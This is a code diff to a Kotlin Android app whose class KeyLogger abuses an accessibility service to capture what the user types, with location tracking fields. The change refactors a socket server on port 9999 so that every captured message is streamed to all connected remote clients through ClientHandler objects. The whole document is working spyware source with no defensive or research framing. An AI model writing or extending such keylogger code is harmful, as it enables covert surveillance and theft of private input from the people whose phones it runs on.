@@ -18,11 +18,8 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
-import java.io.DataOutputStream
 import java.io.IOException
-import java.io.PrintWriter
 import java.net.ServerSocket
-import java.net.Socket
 import java.text.SimpleDateFormat
 import java.util.Date
 
@@ -34,7 +31,8 @@ class KeyLogger : AccessibilityService() {
     private lateinit var locationRequest: LocationRequest
 
     private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
-    private val clients = ArrayList<Socket>()
+    private val clientsList = ArrayList<ClientHandler>()
+
     override fun onServiceConnected() {
         super.onServiceConnected()
 
@@ -99,10 +97,15 @@ class KeyLogger : AccessibilityService() {
         try {
             val serverSocket = ServerSocket(9999)
             while (true) {
-                val client = serverSocket.accept()
-                val inetAddress = client.remoteSocketAddress.toString()
-                Log.d("ip address", inetAddress)
-                clients.add(client)
+                val clientSocket = serverSocket.accept()
+                val clientHandler = ClientHandler(
+                    clientSocket,
+                    {
+                        clientsList.remove(it)
+                    }
+                )
+                clientsList.add(clientHandler)
+                clientHandler.start()
             }
         } catch (e: Exception) {
             e.printStackTrace()
@@ -110,21 +113,9 @@ class KeyLogger : AccessibilityService() {
     }
 
     private fun sendToClient(message: String) {
-        Log.d("keylogger", message + " " + clients.size)
-        try {
-            for (client in clients) {
-                try{
-                    val dataOutputStream = DataOutputStream(client.getOutputStream())
-                    dataOutputStream.writeUTF(message)
-                }catch (e: Exception) {
-                    client.close()
-                    clients.remove(client)
-                    e.printStackTrace()
-                }
-            }
-            Log.d("keylogger", message)
-        } catch (e: Exception) {
-            e.printStackTrace()
+        for (client in clientsList) {
+            client.writeMessage(message)
         }
+        Log.d("keylogger", message)
     }
 }
